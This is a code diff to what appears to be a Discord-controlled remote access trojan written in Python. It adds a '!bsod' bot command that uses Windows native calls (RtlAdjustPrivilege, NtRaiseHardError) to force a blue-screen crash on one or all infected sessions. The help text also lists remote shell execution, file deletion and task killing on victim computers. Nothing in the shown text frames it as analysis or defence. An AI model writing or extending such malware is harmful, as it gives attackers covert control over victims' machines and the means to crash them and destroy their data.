@@ -439,6 +439,18 @@ while True:
                     await ctx.send(f"task {task} killed successfull")
         
         @bot.command()
+        async def bsod(ctx, session):
+            if session == "all":
+                ERROR_CODE = 0xDEADDEAD
+                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+                ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
+            else:
+                if session == sesja:
+                    ERROR_CODE = 0xDEADDEAD
+                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+                    ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
+        
+        @bot.command()
         async def h(ctx):
             wiadomosc = '''
 !shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
@@ -467,6 +479,7 @@ while True:
 !delete [session] [path] -  Deletes a file from the remote computer.
 !wallpaper [session] [path] -  changes the wallpaper on the remote computer.
 !kill [session] [task] - remote task killing.
+!bsod [session] - display bsod(blue screan of death).
             '''
             await ctx.send(wiadomosc)
 
